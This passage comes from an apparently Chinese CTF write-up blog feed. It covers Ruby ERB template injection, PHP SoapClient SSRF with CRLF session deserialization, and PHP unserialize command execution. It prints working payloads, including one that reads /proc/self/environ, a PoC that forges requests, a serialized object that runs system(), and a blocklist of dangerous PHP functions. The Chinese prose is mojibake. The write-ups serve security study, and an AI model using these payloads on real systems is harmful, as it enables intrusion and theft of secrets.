class="string">&quot;SECRET&quot;</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">&#x27;HS256&#x27;</span> &#125;</span><br><span class="line">  auth = auth[<span class="number">0</span>]</span><br><span class="line">  <span class="keyword">unless</span> params[<span class="symbol">:SECRET</span>].<span class="literal">nil</span>?</span><br><span class="line">    <span class="keyword">if</span> ENV[<span class="string">&quot;SECRET&quot;</span>].match(<span class="string">&quot;<span class="subst">#&#123;params[<span class="symbol">:SECRET</span>].match(<span class="regexp">/[0-9a-z]+/</span>)&#125;</span>&quot;</span>)</span><br><span class="line">      puts ENV[<span class="string">&quot;FLAG&quot;</span>]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> params[<span class="symbol">:do</span>] == <span class="string">&quot;<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> is working&quot;</span> <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    auth[<span class="string">&quot;jkl&quot;</span>] = auth[<span class="string">&quot;jkl&quot;</span>].to_i + SecureRandom.random_number(<span class="number">10</span>)</span><br><span class="line">    auth = JWT.encode auth,ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="string">&#x27;HS256&#x27;</span></span><br><span class="line">    cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">    ERB::new(<span class="string">&quot;&lt;script&gt;alert(&#x27;<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> working successfully!&#x27;)&lt;/script&gt;&quot;</span>).result</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ° /work é‚£é‡Œæœ‰ ERB æ¨¡æ¿ï¼Œè¿˜ç›´æ¥æŠŠå¯æ§å‚æ•° name æ‹¼è¿›å»äº†ï¼Œé‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥ä¼ å…¥ä¸€äº›æ„é€ è¿‡çš„å‚æ•°ï¼Œæ¥è¾¾åˆ°æˆ‘ä»¬çš„ç›®çš„äº†ã€‚ä½†æ˜¯é™åˆ¶äº†payloadçš„é•¿åº¦ä¸º7ã€‚æ¯”å¦‚ <code>name=&lt;%=1%&gt;</code>ï¼Œå°±ä¼šå¾— 1ã€‚</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200815194455.png" alt=""></p><p>ä¸€äº›å¸¸è§„çš„SSTIæ³¨å…¥ç”±äºé•¿åº¦çš„é™åˆ¶ï¼Œæœ€å¤šåªèƒ½ç”±ä¸¤ä¸ªå­—ç¬¦ï¼Œè‚¯å®šæ˜¯è¡Œä¸é€šçš„ã€‚</p><p>å¯¹ç…§ <a href="https://blog.csdn.net/zdq0394123/article/details/8443694">Ruby å…¨å±€å˜é‡è¡¨</a> ï¼Œä¸æ–­ fuzzï¼Œå‘ç°<code>$</code>æœ‰ä¸œè¥¿</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200815204424.png" alt=""></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unless</span> params[<span class="symbol">:SECRET</span>].<span class="literal">nil</span>?</span><br><span class="line">    <span class="keyword">if</span> ENV[<span class="string">&quot;SECRET&quot;</span>].match(<span class="string">&quot;<span class="subst">#&#123;params[<span class="symbol">:SECRET</span>].match(<span class="regexp">/[0-9a-z]+/</span>)&#125;</span>&quot;</span>)</span><br><span class="line">      puts ENV[<span class="string">&quot;FLAG&quot;</span>]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>å…¶åœ¨æ¨¡æ¿æ¸²æŸ“ä¹‹å‰ä¹‹å‰æœ‰ä¸ªåŒ¹é…ï¼Œå°±æ˜¯è¿™é‡Œã€‚è¦æ˜¯ SECRET å‚æ•°å­˜åœ¨åˆ™å¯¹å…¶è¿›è¡ŒåŒ¹é…ï¼Œç”¨ä¼ å…¥çš„è¿™ä¸ªå€¼å»å’Œ <code>ENV[&quot;SECRET&quot;]</code> åŒ¹é…ï¼ŒåŒ¹é…ä¸Šäº†å°±å¾€ç»ˆç«¯è¾“å‡º FLAGã€‚ç„¶åæˆ‘ä»¬ SECRET ä¸ä¼ è¯•è¯•ï¼Œè¿™æ ·æ‹¬å·é‡Œçš„åŒ¹é…å°±ä¸è¿›è¡Œï¼Œåªè¿›è¡Œæ‹¬å·å¤–çš„ <code>ENV[&quot;SECRET&quot;]</code> çš„åŒ¹é…ï¼Œå†ç”¨å…¨å±€å˜é‡ <code>$</code> å°±å¯ä»¥è¯»å‡º <code>ENV[&quot;SECRET&quot;]</code> äº†ã€‚</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200815204544.png" alt=""></p><h4 id="è§£æ³•2">è§£æ³•2</h4><p>HTTPå‚æ•°ä¼ é€’ç±»å‹å·®å¼‚äº§ç”Ÿçš„æ”»å‡»é¢</p><p>å…ˆä»‹ç»ä¸€ä¸ªtrick</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="string">&quot;qwertyu&quot;</span></span><br><span class="line">$b = Array[<span class="string">&quot;bbb&quot;</span>,<span class="string">&quot;cc&quot;</span>,<span class="string">&quot;d&quot;</span>]</span><br><span class="line">puts <span class="string">&quot;$a: <span class="subst">#&#123;$a[<span class="number">0</span>,<span class="number">3</span>]&#125;</span>&quot;</span></span><br><span class="line">puts <span class="string">&quot;$b: <span class="subst">#&#123;$b[<span class="number">0</span>,<span class="number">3</span>]&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a: qwe</span><br><span class="line">$b: [&quot;bbb&quot;, &quot;cc&quot;, &quot;d&quot;]</span><br></pre></td></tr></table></figure><p>$bå˜é‡åŸæœ¬æ˜¯æ•°ç»„ï¼Œä½†æ˜¯ç”±äºè¢«æ‹¼æ¥åˆ°äº†å­—ç¬¦ä¸²ä¸­ï¼Œæ‰€ä»¥æ•°ç»„åšäº†ä¸€ä¸ªé»˜è®¤çš„ç±»å‹è½¬æ¢å˜æˆäº†<code>[&quot;bbb&quot;, &quot;cc&quot;, &quot;d&quot;]</code></p><p>æœ‰äº†è¿™ä¸ªtrickï¼Œä¸Šé¢ä»£ç [0,7]ä»åŸæœ¬çš„é™åˆ¶7ä¸ªå­—ç¬¦çªç„¶å˜æˆäº†é™åˆ¶7ä¸ªæ•°ç»„é•¿åº¦</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;work?SECRET&#x3D;a&amp;do&#x3D;[&quot;&lt;%&#x3D; File.open(&#39;&#x2F;proc&#x2F;self&#x2F;environ&#39;).read %&gt;&quot;, &quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;] is working&amp;name[]&#x3D;&lt;%&#x3D; File.open(&#39;&#x2F;proc&#x2F;self&#x2F;environ&#39;).read %&gt;&amp;name[]&#x3D;1&amp;name[]&#x3D;2&amp;name[]&#x3D;3&amp;name[]&#x3D;4&amp;name[]&#x3D;5&amp;name[]&#x3D;6</span><br></pre></td></tr></table></figure><blockquote><p>éœ€è¦å¯¹doå‚æ•°urlencodeç¼–ç </p></blockquote><h3 id="å‚è€ƒ">å‚è€ƒ</h3><p><a href="https://writeup.ctfhub.com/Challenge/2019/SCTF/34251.html">https://writeup.ctfhub.com/Challenge/2019/SCTF/34251.html</a></p><p><a href="https://evoa.me/archives/15/">https://evoa.me/archives/15/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;SCTF2019-Flag-Shop&quot;&gt;SCTF2019 Flag Shop&lt;/h2&gt;
&lt;h3 id=&quot;è€ƒç‚¹&quot;&gt;è€ƒç‚¹&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;JWTä¼ªé€ &lt;/li&gt;
&lt;li&gt;Ruby SSTI&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;è§£é¢˜&quot;&gt;è§£é¢˜&lt;/h3&gt;
&lt;h4
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/categories/CTF/"/>
    
      <category term="Rubyå’ŒGo" scheme="http://ca0y1h.top/categories/CTF/Ruby%E5%92%8CGo/"/>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>buuctfåˆ·é¢˜â€”â€”PHPååºåˆ—åŒ–</title>
    <link href="http://ca0y1h.top/Web_security/ctf_writeup/6.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://ca0y1h.top/Web_security/ctf_writeup/6.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2020-08-18T11:45:46.000Z</published>
    <updated>2020-09-16T11:54:26.535Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BUUCTFåˆ·é¢˜â€”â€”PHPååºåˆ—åŒ–">BUUCTFåˆ·é¢˜â€”â€”PHPååºåˆ—åŒ–</h1><h2 id="LCTF2018-Bestphpâ€™s-revenge">LCTF2018 Bestphpâ€™s revenge</h2><blockquote><p>è¿™ç¯‡æ–‡ç« åˆ†æçš„å¾ˆåˆ°ä½ï¼š<a href="https://www.anquanke.com/post/id/164569#h2-5">https://www.anquanke.com/post/id/164569#h2-5</a></p></blockquote><h3 id="è€ƒç‚¹">è€ƒç‚¹</h3><ul><li>sessionååºåˆ—åŒ–</li><li>Soapclient + ssrf</li><li>CRLF</li></ul><h3 id="è§£é¢˜">è§£é¢˜</h3><p><code>index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$b = <span class="string">&#x27;implode&#x27;</span>;</span><br><span class="line">call_user_func($_GET[<span class="string">&#x27;f&#x27;</span>], $_POST);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;name&#x27;</span>] = $_GET[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = <span class="keyword">array</span>(reset($_SESSION), <span class="string">&#x27;welcome_to_the_lctf2018&#x27;</span>);</span><br><span class="line">call_user_func($b, $a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>flag.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">only localhost can get flag!</span><br><span class="line">session_start(); </span><br><span class="line">echo &#39;only localhost can get flag!&#39;; </span><br><span class="line">$flag &#x3D; &#39;LCTF&#123;*************************&#125;&#39;; </span><br><span class="line">if($_SERVER[&quot;REMOTE_ADDR&quot;]&#x3D;&#x3D;&#x3D;&quot;127.0.0.1&quot;)&#123; </span><br><span class="line">$_SESSION[&#39;flag&#39;] &#x3D; $flag; </span><br><span class="line">&#125; </span><br><span class="line">only localhost can get flag!</span><br></pre></td></tr></table></figure><p>æ€è·¯å¦‚ä¸‹ï¼š</p><ol><li>åˆ©ç”¨ç¬¬4è¡Œå›è°ƒå‡½æ•°æ¥è°ƒç”¨<code>session_start()</code>ç”¨äºè¦†ç›–sessionåºåˆ—åŒ–å¼•æ“ä¸ºphp_serilazeï¼›</li><li>æ„é€ SSRFçš„Soapç±»çš„åºåˆ—åŒ–å­—ç¬¦ä¸²é…åˆä¸Šé¢çš„åºåˆ—åŒ–æ³¨å…¥å†™å…¥sessionæ–‡ä»¶ï¼Œå¹¶ä¸”æ„é€ çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­åˆ©ç”¨äº†CRLFæ¼æ´å†™å…¥äº†æˆ‘ä»¬è§„å®šçš„seesion_idï¼›</li><li>ç„¶åå†é€šè¿‡ç¬¬4è¡Œçš„å›è°ƒå‡½æ•°è°ƒç”¨<code>extract()</code>å‡½æ•°ç”¨äºå˜é‡è¦†ç›–ï¼Œè¦†ç›–æ‰å˜é‡bä¸ºå›è°ƒå‡½æ•°<code>call_user_func</code>ï¼›</li><li>åŒæ—¶æˆ‘ä»¬å¯ä»¥ä¼ å…¥<code>name=SoapClient</code>ï¼Œé‚£ä¹ˆæœ€å<code>call_user_func($b, $a)</code>å°±å˜æˆ<code>call_user_func(array('SoapClient','welcome_to_the_lctf2018'))</code>,å³<code>call_user_func(SoapClient-&gt;welcome_to_the_lctf2018)</code>ï¼Œç”±äº<code>SoapClient</code>ç±»ä¸­æ²¡æœ‰<code>welcome_to_the_lctf2018</code>è¿™ä¸ªæ–¹æ³•ï¼Œå°±ä¼šè°ƒç”¨é­”æœ¯æ–¹æ³•<code>__call()</code>ä»è€Œå‘é€è¯·æ±‚ã€‚</li><li>å‘é€è¯·æ±‚ä¹Ÿå°±æ˜¯å»è®¿é—®flag.phpï¼Œå¹¶å°†ç»“æœä¿å­˜åœ¨cookieä¸ºç¬¬äºŒæ­¥æˆ‘ä»¬è§„å®šçš„session_idçš„æ–‡ä»¶ä¸­ã€‚</li><li>å†ç”¨è¿™ä¸ªsessionè®¿é—®ä¸»é¡µï¼Œå°±ä¼š<code>var_dump</code>sessionæ–‡ä»¶çš„å†…å®¹ï¼Œå…¶ä¸­å°±åŒ…å«å­—æ®µåä¸º<code>flag</code>çš„å€¼ã€‚</li></ol><p>å…ˆæ„é€ POCï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>;</span><br><span class="line">$attack = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; $target,</span><br><span class="line">    <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&quot;N0rth3ty\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4\r\n&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&quot;123&quot;</span>));</span><br><span class="line">$payload = urlencode(serialize($attack));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;|&#x27;</span>.$payload;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªpocå°±æ˜¯åˆ©ç”¨crlfä¼ªé€ è¯·æ±‚å»è®¿é—®flag.phpå¹¶å°†ç»“æœä¿å­˜åœ¨cookieä¸º<code>PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4</code>çš„sessionä¸­ã€‚</p><p>å†æ³¨å…¥ååºåˆ—åŒ–çš„å­—ç¬¦ä¸²ï¼š</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200623152347.png" alt=""></p><p>æ¥ç€è§¦å‘<code>SoapClient</code>çš„<code>__call</code>æ–¹æ³•å‘é€è¯·æ±‚ï¼š</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200623152825.png" alt=""></p><p>æ›´æ”¹cookieè®¿é—®ï¼š</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200623152931.png" alt=""></p><h3 id="åè®°">åè®°</h3><p>è¿™é“é¢˜å¡äº†æˆ‘ä¸€å¤©çš„æ—¶é—´ï¼Œè¿˜æ˜¯ä¸€ä¸ªç­¾åˆ°é¢˜ã€‚ã€‚ã€‚ã€‚æœ‰ä¸€ä¸ªé—®é¢˜ä¸€ç›´å›°æ‰°æˆ‘ï¼Œå°±æ˜¯æŠŠPOCç”Ÿæˆçš„å­—ç¬¦ä¸²å†™åˆ°sessionæ–‡ä»¶åï¼Œä»–æ˜¯ä»€ä¹ˆæ—¶å€™æŠŠsessionçš„æ–‡ä»¶å†…å®¹ç»™ååºåˆ—åŒ–å‡ºæ¥äº†ã€‚åæ¥çœ‹äº†ä¸€ç¯‡æ–‡ç« æ‰çŸ¥é“ï¼š</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200623153337.png" alt=""></p><p>äºæ˜¯å°±ååºåˆ—åŒ–äº†ä¸€ä¸ª<code>SoapClient</code>çš„å®ä¾‹ï¼Œå†è°ƒç”¨<code>__call</code>å‡½æ•°çš„æ—¶å€™å°±ä¼šé€šè¿‡è¿™ä¸ªå®ä¾‹å‘é€è¯·æ±‚ã€‚</p><h2 id="å¼ºç½‘æ¯2020é’é¾™ç»„-phpweb">å¼ºç½‘æ¯2020é’é¾™ç»„ phpweb</h2><h3 id="è€ƒç‚¹-v2">è€ƒç‚¹</h3><ul><li>PHPååºåˆ—åŒ–</li></ul><h3 id="è§£é¢˜-v2">è§£é¢˜</h3><p>æ‰“å¼€é¢˜ç›®ï¼ŒæŸ¥çœ‹æºç æœ‰ä¸¤ä¸ªéšè—è¾“å…¥æ¡†</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200704180308.png" alt=""></p><p>éšä¾¿è¾“å…¥æµ‹è¯•ï¼Œæœ‰ä¸€ä¸ªæŠ¥é”™å›æ˜¾ï¼Œå‘ç°è¿™ä¸¤ä¸ªè¾“å…¥æ¡†æ˜¯call_user_funcå‡½æ•°çš„å‚æ•°ã€‚</p><p>å¹¶ä¸”åŸºæœ¬ä¸Šè¿‡æ»¤å±é™©å‡½æ•°ï¼Œç”¨file_get_contentsè¯»å–<code>index.php</code>æºç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $disable_fun = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params">$func, $p</span>) </span>&#123;</span><br><span class="line">        $result = call_user_func($func, $p);</span><br><span class="line">        $a= gettype($result);</span><br><span class="line">        <span class="keyword">if</span> ($a == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $result;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $p = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> $func = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $func = $_REQUEST[<span class="string">&quot;func&quot;</span>];</span><br><span class="line">    $p = $_REQUEST[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($func != <span class="literal">null</span>) &#123;</span><br><span class="line">        $func = strtolower($func);</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime($func, $p);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æœ‰ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„<code>__destruct</code>å‡½æ•°ï¼Œå¯ä»¥æ‰§è¡Œå‡½æ•°å¹¶ä¸”æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œä¸è¿‡æ²¡æœ‰è§¦å‘ååºåˆ—åŒ–çš„ç‚¹ã€‚</p><p>ä½†æ˜¯è¿˜æ˜¯å¯ä»¥åˆ©ç”¨<code>gettime</code>å‡½æ•°ä¸­çš„<code>call_user_func</code>å‡½æ•°ä¼ å…¥<code>unserialize</code>å‡½æ•°ï¼Œç”Ÿæˆå­—ç¬¦ä¸²ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $p = <span class="string">&quot;cat /tmp/flagoefiu4r93&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> $func = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$t = <span class="keyword">new</span> Test;</span><br><span class="line">$ut = serialize($t);</span><br><span class="line"><span class="keyword">echo</span> $ut;</span><br></pre></td></tr></table></figure><p>ä¼ å…¥å‚æ•°<code>unserialize</code>å’Œ<code>O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code>ã€‚</p><h2 id="ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz">[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</h2><h3 id="TODO">TODO</h3><h2 id="å®‰æ´µæ¯-2019-easy-serialize-php">[å®‰æ´µæ¯ 2019] easy_serialize_php</h2><h3 id="è€ƒç‚¹-v3">è€ƒç‚¹</h3><ul><li>ä»£ç å®¡è®¡</li><li>PHP ååºåˆ—åŒ–å¯¹è±¡é€ƒé€¸</li></ul><h3 id="è§£é¢˜-v3">è§£é¢˜</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$function = @$_GET[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$img</span>)</span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    $filter = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,$filter_arr).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">&#x27;&#x27;</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">$_SESSION[<span class="string">&#x27;function&#x27;</span>] = $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$function)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode($_GET[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($function == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span 